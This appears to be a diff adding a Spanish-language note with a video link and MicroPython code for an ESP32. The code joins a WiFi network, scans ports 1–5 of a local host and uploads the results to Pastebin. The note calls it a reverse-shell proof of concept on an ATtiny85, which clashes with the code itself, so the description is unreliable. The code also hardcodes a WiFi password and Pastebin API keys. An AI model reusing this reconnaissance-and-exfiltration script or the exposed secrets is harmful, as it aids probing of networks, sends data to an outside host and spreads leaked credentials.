@@ -1,0 +1,109 @@
+Video de la prueba de concepto del shell reverse en un attiny85 funcionando:
+
+
+
+https://www.youtube.com/watch?v=9BB8pVN8SX8&t=2s&ab_channel=SerchxD2
+
+
+Codigo usado:
+
+
+
+import network
+import usocket
+import urequests
+
+# Configura la conexión WiFi
+ssid = 'INFINITUMDC18'
+password = 'dXXe66aFEE'
+
+def connect_wifi():
+    wlan = network.WLAN(network.STA_IF)
+    wlan.active(True)
+    if not wlan.isconnected():
+        print('Conectando a la red...')
+        wlan.connect(ssid, password)
+        while not wlan.isconnected():
+            pass
+    print('Conexión exitosa:', wlan.ifconfig())
+
+# Función para escanear puertos de un host específico
+def port_scan(host):
+    port_status = {}
+    for port in range(1, 6):  # Escanea solo los puertos del 1 al 5
+        sock = usocket.socket(usocket.AF_INET, usocket.SOCK_STREAM)
+        sock.settimeout(0.5)  # Tiempo de espera
+        try:
+            sock.connect((host, port))
+            port_status[port] = "Abierto"  # El puerto está abierto
+        except:
+            port_status[port] = "Cerrado"  # El puerto está cerrado
+        sock.close()
+    return port_status
+
+# Implementación básica de quote para codificar caracteres
+def quote(string):
+    result = ''
+    for c in string:
+        # Añadir caracteres alfanuméricos directamente
+        if c >= '0' and c <= '9':
+            result += c
+        elif c >= 'A' and c <= 'Z':
+            result += c
+        elif c >= 'a' and c <= 'z':
+            result += c
+        else:
+            result += '%{:02X}'.format(ord(c))  # Convertir otros caracteres a formato %XX
+    return result
+
+# Función para formatear datos en URL encoding
+def urlencode(data):
+    return '&'.join(f'{key}={quote(str(value))}' for key, value in data.items())
+
+# Función para subir a Pastebin usando api_user_key
+def paste_to_pastebin(content, api_key, user_key):
+    pastebin_url = 'https://pastebin.com/api/api_post.php'
+    data = {
+        'api_dev_key': api_key,
+        'api_user_key': user_key,  # Asociar a tu cuenta
+        'api_option': 'paste',
+        'api_paste_code': content,
+        'api_paste_private': '1',
+        'api_paste_expire_date': '10M'
+    }
+    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+    encoded_data = urlencode(data)  # Codificar los datos
+    response = urequests.post(pastebin_url, data=encoded_data, headers=headers)
+    if response.status_code == 200:
+        return response.text  # Este es el enlace al Pastebin
+    else:
+        return None
+
+# Ejecutar el código al iniciar
+def main():
+    # Conectar a WiFi
+    connect_wifi()
+    
+    # Escanear los puertos de la IP 192.168.1.72
+    host = '192.168.1.72'
+    port_status = port_scan(host)
+
+    # Formatear el contenido para el Pastebin
+    scan_results = f"Portscanner ESP32\nIP Objetivo: {host}\n"
+    for port, status in port_status.items():
+        scan_results += f"Puerto {port}: {status}\n"
+    
+    print(scan_results)  # Muestra los resultados en la consola
+    
+    # Subir resultados a Pastebin
+    pastebin_api_key = 'oqTrjpcxutJHMlLM75Aqzo5sFaAFbEPC'
+    pastebin_user_key = '22714e7e3c15fe3671a37b965bcab2b4'  # Tu API User Key
+    pastebin_link = paste_to_pastebin(scan_results, pastebin_api_key, pastebin_user_key)
+    
+    if pastebin_link:
+        print('Resultados disponibles en:', pastebin_link)
+    else:
+        print('Error al subir a Pastebin')
+
+# Iniciar el script
+main()
